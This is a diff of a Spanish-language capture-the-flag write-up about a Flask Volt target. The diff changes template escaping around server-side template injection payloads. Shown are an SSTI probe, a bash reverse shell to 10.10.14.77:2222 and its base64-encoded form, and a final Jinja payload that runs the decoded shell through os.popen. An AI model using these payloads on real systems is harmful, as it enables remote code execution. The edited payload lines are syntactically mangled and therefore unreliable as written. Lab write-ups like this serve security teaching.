@@ -100,7 +100,7 @@ Ahora vemos una página de Flask Volt. Es solo una plantilla en GitHub para la p
 
 Probamos e ingresamos con credenciales por defecto.
 
-La página de configuración tiene un campo de entrada para el nombre de usuario, por lo que se prueba con la carga útil `{% raw %}{% raw %}{{7*7}}{% endraw %}{% endraw %}`. Debería devolver el resultado 49 en el nombre de la tarjeta de usuario.
+La página de configuración tiene un campo de entrada para el nombre de usuario, por lo que se prueba con la carga útil ` {7*7} `. Debería devolver el resultado 49 en el nombre de la tarjeta de usuario.
 
 ![SSTI test](/secciones/posts/imagenes/goodgames/target1.webp)
 
@@ -127,7 +127,7 @@ echo "bash -i >& /dev/tcp/10.10.14.77/2222 0>&1" | base64
 
 **Payload final:**
 ```python
-{% raw %}{% raw %}{% raw %}{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43Ny8yMjIyIDA+JjEK" |base64 -d| bash').read() }}{% endraw %}{% endraw %}{% endraw %}
+'{'{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43Ny8yMjIyIDA+JjEK" |base64 -d| bash').read() } '}'
 ```
 
 ## Reconocimiento del contenedor
